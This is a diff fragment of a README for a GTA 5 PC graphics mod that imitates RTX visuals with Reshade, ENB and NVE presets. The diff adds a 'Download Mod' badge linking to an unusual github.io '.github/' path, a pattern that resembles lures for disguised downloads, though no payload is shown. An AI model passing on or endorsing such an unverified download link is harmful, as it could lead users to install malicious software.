@@ -4,6 +4,8 @@
 
 Wanna give GTA 5 on PC that next‑gen graphic boost? This guide dives into how to simulate RTX‑grade visuals using Reshade, ENB, & NVE presets—no actual ray tracing card needed.
 
+
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://gta-5-rtx-mod.github.io/.github/)
 ---
 
 ## What Is This Mod About
